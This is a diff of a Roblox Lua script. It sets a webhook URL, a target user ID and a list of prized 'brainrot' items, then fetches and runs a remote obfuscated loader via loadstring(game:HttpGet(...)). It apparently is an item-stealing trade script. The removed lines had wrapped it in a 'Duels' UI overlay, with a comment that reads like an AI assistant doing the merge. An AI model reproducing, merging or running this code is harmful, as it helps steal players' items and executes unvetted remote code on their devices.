@@ -1,12 +1,7 @@
--- ───────────────────────────────────────────────────────────────
---  Your original script (webhook + brainrot trading logic)
--- ───────────────────────────────────────────────────────────────
-
 getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_c0e31a7b3fbb43b5a0edfde935a4953b"
 getgenv().TARGET_ID = 3294540129
-getgenv().DELAY_STEP = 1
-getgenv().TRADE_CYCLE_DELAY = 2
-
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
 getgenv().TARGET_BRAINROTS = {
     ["Bacuru and Egguru"] = true,
     ["Burguro And Fryuro"] = true,
@@ -75,62 +70,4 @@ getgenv().TARGET_BRAINROTS = {
     ["Tuff Toucan"] = true,
     ["W or L"] = true
 }
-
--- Load your trading script / hub / whatever this is
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
-
--- ───────────────────────────────────────────────────────────────
---  22s DUELS BLUE EDITION UI + features (integrated safely)
--- ───────────────────────────────────────────────────────────────
-
--- Only run once + after game is loaded
-if getgenv()._22S_DUELS_LOADED then return end
-getgenv()._22S_DUELS_LOADED = true
-
-task.spawn(function()
-    repeat task.wait() until game:IsLoaded()
-
-    local Players        = game:GetService("Players")
-    local RunService     = game:GetService("RunService")
-    local UserInputService = game:GetService("UserInputService")
-    local TweenService   = game:GetService("TweenService")
-    local SoundService   = game:GetService("SoundService")
-    local Lighting       = game:GetService("Lighting")
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local HttpService    = game:GetService("HttpService")
-    local Player         = Players.LocalPlayer
-
-    -- ────────────────────────────────────────
-    --  Paste the COMPLETE 22s source code here
-    --  (everything from repeat task.wait() until ... end)
-    -- ────────────────────────────────────────
-
-    repeat task.wait() until game:IsLoaded()
-
-    -- ... paste the entire 22s code from your document here ...
-    -- (I'm not copying ~800 lines again — replace this comment
-    --  with the full code block you provided in the question)
-
-    -- Make sure these two lines exist at the very end of the 22s code:
-    -- UserInputService.InputBegan:Connect( ... )
-    -- UserInputService.InputEnded:Connect( ... )
-
-    -- Optional: rename the ScreenGui so it doesn't conflict
-    local sg = Player.PlayerGui:FindFirstChild("22S_BLUE")
-    if sg then
-        sg.Name = "22S_Duels_Overlay"
-    end
-
-    -- Optional: quieter startup message
-    print("[22s] Movement / combat UI loaded → press U to toggle")
-
-    -- Let user know both systems are running
-    task.delay(1.5, function()
-        if Player:FindFirstChild("PlayerGui") then
-            local hint = Instance.new("Hint")
-            hint.Text = "Trading script + 22s movement UI both active (U = toggle GUI)"
-            hint.Parent = Player.PlayerGui
-            game:GetService("Debris"):AddItem(hint, 6)
-        end
-    end)
-end)
